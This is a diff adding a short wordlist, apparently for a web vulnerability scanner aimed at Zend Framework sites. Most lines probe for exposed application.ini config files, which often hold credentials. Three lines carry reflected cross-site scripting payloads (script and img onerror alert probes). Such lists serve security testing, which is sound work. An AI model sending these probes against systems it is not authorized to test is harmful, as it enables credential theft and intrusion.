@@ -1,0 +1,16 @@
+/application/configs/application.ini
+/admin/configs/application.ini
+/application.ini
+/aplicacao/application/configs/application.ini
+/cloudexp/application/configs/application.ini
+/cms/application/configs/application.ini
+/moto/application/configs/application.ini
+/Partners/application/configs/application.ini
+/radio/application/configs/application.ini
+/seminovos/application/configs/application.ini
+/shop/application/configs/application.ini
+/site_cg/application/configs/application.ini
+/slr/application/configs/application.ini
+/index.php?debug_host=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&start_debug=1
+/vendor/diablomedia/zendframework1-http/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(1)>
+/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(document.domain)>
